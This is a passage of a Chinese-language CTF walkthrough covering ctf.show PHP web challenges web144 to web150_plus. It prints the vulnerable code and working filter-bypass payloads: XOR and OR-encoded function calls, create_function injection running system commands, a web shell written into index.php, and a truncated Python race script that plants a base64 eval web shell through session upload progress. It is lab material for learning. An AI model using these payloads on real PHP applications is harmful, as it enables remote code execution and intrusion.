punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÈôêÂà∂‰∫Üv3ÁöÑÈïøÂ∫¶ÔºåÂπ∂ÂØπv2ËøõË°åcheck,ÂèØ‰ª•‰ΩøÁî®<code>|``^</code>Âè™ÊòØË∞ÉÊç¢‰ΩçÁΩÆÁΩ¢‰∫Ü</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Ê≠£ÂàôËøêÁÆóÈÉΩË¢´ban‰∫ÜÔºåÂèØ‰ª•‰ΩøÁî®<code>|</code>Âíå<code>~</code>ÊàñËÄÖ‰∏âÁõÆËøêÁÆóÁ¨¶ÔºåÂè¶Â§ñ<code>&quot;</code>‰πüË¢´ban‰∫ÜÔºåÂèØ‰ª•‰ΩøÁî®<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(‚Äò%13%19%13%14%05%0d‚Äô|‚Äô%60%60%60%60%60%60‚Äô)(‚Äò%14%01%03%00%06%0c%01%07%02%10%08%10‚Äô|‚Äô%60%60%60%20%60%60%60%60%2c%60%60%60‚Äô)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>‰∏âÁõÆËøêÁÆóÁ¨¶Ë¢´ban‰∫ÜÔºå‰ΩÜÊòØÂΩ±Âìç‰∏çÂ§ß</p><h4 id="web147-PHPÂëΩÂêçÁ©∫Èó¥-create-functionÂáΩÊï∞‰ª£Á†ÅÊ≥®ÂÖ•"><a href="#web147-PHPÂëΩÂêçÁ©∫Èó¥-create-functionÂáΩÊï∞‰ª£Á†ÅÊ≥®ÂÖ•" class="headerlink" title="web147(PHPÂëΩÂêçÁ©∫Èó¥  create_functionÂáΩÊï∞‰ª£Á†ÅÊ≥®ÂÖ•)"></a>web147(PHPÂëΩÂêçÁ©∫Èó¥  create_functionÂáΩÊï∞‰ª£Á†ÅÊ≥®ÂÖ•)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Ê≠£ÂàôÂåπÈÖçÁªïËøáÔºåÂè™Ë¶ÅctfshowÈáåÊúâ‰∏Ä‰∏™‰∏çÊòØÊï∞Â≠ó„ÄÅÂ∞èÂÜôÂ≠óÊØçÂíå‰∏ãÂàíÁ∫øÂ∞±ËÉΩÁªïËøá„ÄÇ</p><blockquote><p><strong>&#x2F;i</strong>ÔºöÂ§ßÂ∞èÂÜô‰∏çÊïèÊÑüÂåπÈÖç</p><p><strong>&#x2F;s</strong>ÔºöÁÇπÂè∑ÂÖÉÂ≠óÁ¨¶ÂåπÈÖçÊâÄÊúâÂ≠óÁ¨¶ÔºåÂåÖÂê´Êç¢Ë°åÁ¨¶„ÄÇ</p><p><strong>&#x2F;D</strong>ÔºöÂÖÉÂ≠óÁ¨¶ÁæéÂÖÉÁ¨¶Âè∑‰ªÖ‰ªÖÂåπÈÖçÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ÁöÑÊú´Â∞æ</p></blockquote><blockquote><p>phpÈáåÈªòËÆ§ÂëΩÂêçÁ©∫Èó¥ÊòØ\ÔºåÊâÄÊúâÂéüÁîüÂáΩÊï∞ÂíåÁ±ªÈÉΩÂú®Ëøô‰∏™ÂëΩÂêçÁ©∫Èó¥‰∏≠„ÄÇ Ë∞ÉÁî®‰∏Ä‰∏™ÂáΩÊï∞Êó∂Áõ¥Êé•ÂÜôÂáΩÊï∞Âêçfunction_name()ÔºåÁõ∏ÂΩì‰∫éÊòØÁõ∏ÂØπË∑ØÂæÑË∞ÉÁî®Ôºõ Â¶ÇÂÜôÊüê‰∏ÄÂÖ®Â±ÄÂáΩÊï∞ÁöÑÂÆåÂÖ®ÈôêÂÆöÂêçÁß∞\function_name()Ë∞ÉÁî®ÔºåÂàôÊòØÂÜô‰∫Ü‰∏Ä‰∏™ÁªùÂØπË∑ØÂæÑ„ÄÇ</p></blockquote><p><img src="web147.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy"></p><p>ÔºàËØ¶ÊÉÖÂèØ‰ª•ÁúãphpÊâãÂÜåÈáåÁöÑÂëΩÂêçÁ©∫Èó¥ÈÉ®ÂàÜÔºâ</p><p>ÊâÄ‰ª•postÊó∂<code>ctf</code>ÂèØ‰ª•ÈÄöËøáÂä†‰∏ä<code>\</code>ÁªïËøáÂåπÈÖç„ÄÇ%5c</p><p>Êâæ‰∏™‰∏çÈúÄË¶ÅÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞ÁöÑÂáΩÊï∞„ÄÇÂèØ‰ª•Áî®create_functionÂåøÂêçÂáΩÊï∞„ÄÇËôΩÁÑ∂ËØ•ÂáΩÊï∞Ëá™PHP 7.2Ëµ∑Â∑≤ÁªèÂºÉÁî®Ôºå‰ΩÜÊòØËøòÊòØÂèØ‰ª•evalÊâßË°åÂáΩÊï∞ÔºåÂè™ÊòØÈúÄË¶ÅÊääÂåøÂêçÈÉ®ÂàÜÈó≠Âêà„ÄÇ</p><p><strong>get</strong>Ôºö<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>Ôºö<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞" loading="lazy"></p><p>ÂèØ‰ª•Ëøô‰πàÁêÜËß£Ôºöcreate_functionÂàõÂª∫‰∏Ä‰∏™ÂåøÂêçÂáΩÊï∞ÔºåÊàë‰ª¨ÂÅáËÆæÂ∞±Âè´niming„ÄÇ <code>string create_function( string $args, string $code)</code>ÈÇ£‰πàÂÖ∑‰ΩìÂ∞±ÊòØÂ¶Ç‰∏ãÈù¢ÊâÄÁ§∫ÁöÑÊ†∑Â≠êÔºö</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>ÊâÄ‰ª•Â∞±ÈúÄË¶Å<code>&#125;</code>Èó≠ÂêàÔºåÈó≠Âêà‰πãÂêéÔºåÈÇ£Â∞±Â§öÂá∫Êù•‰∏Ä‰∏™<code>&#125;</code>ÔºåËøôÂ∞±ÈúÄË¶ÅÁî®Ê≥®ÈáäÁ¨¶Ê≥®ÈáäÊéâ„ÄÇ</p><h4 id="web148-‰∏≠ÊñáÂèòÈáè-ÂºÇÊàñ"><a href="#web148-‰∏≠ÊñáÂèòÈáè-ÂºÇÊàñ" class="headerlink" title="web148(‰∏≠ÊñáÂèòÈáè  ÂºÇÊàñ)"></a>web148(‰∏≠ÊñáÂèòÈáè  ÂºÇÊàñ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Ê≤°banÂºÇÊàñ</p><p>PayloadÔºö<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>È¢ÑÊúüËß£ÊòØ‰ΩøÁî®‰∏≠Êñá <code>?code=$Âìà=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$Âìà&#125;[Âìº]($&#123;$Âìà&#125;[ÂóØ]);&amp;Âìº=system&amp;ÂóØ=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> ÂºÇÊàñÂá∫Êù•ÁöÑÁªìÊûúÊòØ _GET</p><h4 id="web149-unlink-Êñá‰ª∂Ë¶ÜÁõñ"><a href="#web149-unlink-Êñá‰ª∂Ë¶ÜÁõñ" class="headerlink" title="web149(unlink  Êñá‰ª∂Ë¶ÜÁõñ)"></a>web149(unlink  Êñá‰ª∂Ë¶ÜÁõñ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> ÂáΩÊï∞Âà†Èô§Êñá‰ª∂„ÄÇ</p><p>Ëã•ÊàêÂäüÔºåÂàôËøîÂõû trueÔºåÂ§±Ë¥•ÂàôËøîÂõû false„ÄÇ</p><p>Áõ¥Êé•Âêëindex.phpÂÜôÈ©¨Â∞±Ë°å</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#ËøáÊª§Â≠óÁ¨¶</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIPÂèØ‰ª•ÈÄöËøáextractËøõË°åÂèòÈáèË¶ÜÁõñÔºåctfË¢´ÈôêÂà∂‰∏çËÉΩÊúâ:</p><p>ÂèØ‰ª•Âà©Áî®nginxÊó•ÂøóÊñá‰ª∂ÂÜôÈ©¨</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>ËøáÊª§‰∫ÜlogÔºåÁúãÁùÄÂèØ‰ª•Áî®Êù°‰ª∂Á´û‰∫â</p><p>Áúã‰∫Ühint Âà©Áî® <code>__autoload()</code></p><p>‰∫éÊòØÊü•‰∫Ü‰∏Ä‰∏ã <code>class_exists()</code> Ëøô‰∏™ÂáΩÊï∞</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>‰øÆÂ§ç‰∫ÜÈùûÈ¢ÑÊúüÔºå‰∏çËÆ©ÂåÖÂê´Êó•ÂøóÊñá‰ª∂‰∫Ü„ÄÇ</p><p>ËøôÈáåÂà©Áî®‰∫Ü <code>extract</code> Ë¶ÜÁõñÂèòÈáè‰ºöÊää <code>Á©∫Ê†º [ .</code> ÈÉΩÁªôËΩ¨Êàê‰∏ãÂàíÁ∫øÁöÑÁâπÊÄßÔºåÁªïËøáÊ≠£ÂàôËøáÊª§„ÄÇÁÑ∂ÂêéÂ∞±ÊòØ <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> Á¨¨‰∫å‰∏™ÂèÇÊï∞ÈªòËÆ§‰∏∫ <code>true</code>ÔºåÂú®Á±ª‰∏çÂ≠òÂú®Êó∂‰ºöË∞ÉÁî® <code>__autoload</code> ÂáΩÊï∞Ôºå<code>__autoload</code> ËøôÈáåÂÜôÁöÑÊòØË∞ÉÁî®Ë¶ÅÂä†ËΩΩÁöÑÁ±ªÂêçÁöÑÂáΩÊï∞Ôºå‰º† <code>phpinfo</code> Â∞±ËÉΩÂæóÂà∞ <code>session</code>Áõ∏ÂÖ≥‰ø°ÊÅØÔºå‰ªéËÄåÂåÖÂê´ <code>session</code>„ÄÇ</p><p>payload1: <code>?..CTFSHOW..=phpinfo</code></p><p>ÂèØ‰ª•ÁúãÂà∞ <code>session.use_strict_mode</code> ‰∏∫ OffÔºåËØ¥ÊòéÂèØ‰ª•Ëá™ÂÆö‰πâ <code>session_id</code>ÔºåÊéßÂà∂ <code>session</code> Êñá‰ª∂ÂêçÔºå <code>session.save_path</code> ‰∏∫Á©∫ÔºåÁ°ÆÂÆöÊñá‰ª∂ÂåÖÂê´Ë∑ØÂæÑ <code>/tmp/sess_&#123;session_id&#125;</code>„ÄÇÊîπ‰∏Ä‰∏ãÁ•ñ‰º†ËÑöÊú¨ÂÜô shell„ÄÇ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingurl <span class="token operator">=</span> <span class="token string">'http://fa7db7de-329e-44cf-8270-bcd8d7f96368.challenge.ctf.show:8080/?isVIP=1'</span>event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'PHP_SESSION_UPLOAD_PROGRESS'</span><span class="token punctuation">:</span> <span class="token string">'aaaaaa&lt;?php file_put_contents("/var/www/html/s.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=="));?>'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span>        _ <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'down'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'file'</span><span 